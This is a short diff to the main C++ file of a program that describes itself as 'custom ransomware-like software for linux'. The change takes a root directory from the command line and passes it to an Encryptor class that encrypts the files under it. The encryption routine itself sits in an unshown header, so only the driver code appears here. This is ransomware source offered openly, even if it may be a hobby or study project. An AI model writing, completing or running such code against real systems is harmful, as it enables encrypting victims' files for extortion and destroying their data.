@@ -5,6 +5,8 @@
 #include <cxxopts.hpp>
 #include <fmt/format.h>
 
+#include <ransomware.h>
+
 int main(int const argc, char const *const argv[])
 {
     auto options = cxxopts::Options("ransomware", "Custom ransomware-like software for linux");
@@ -18,7 +20,15 @@ int main(int const argc, char const *const argv[])
         std::exit(EXIT_SUCCESS);
     }
 
-    std::cout << fmt::format("Root directory for encryption: {}\n", result["root"].as<std::string>());
+    auto const rootPath = result["root"].as<std::string>();
+    std::cout << fmt::format("Root directory for encryption: {}\n", rootPath);
+
+    try {
+        auto encryptor = Encryptor(rootPath);
+        encryptor.Encrypt();
+    } catch (std::exception &e) {
+        std::cerr << fmt::format("Encryption failed with an exception: {}\n", e.what());
+    }
 
     return 0;
 }
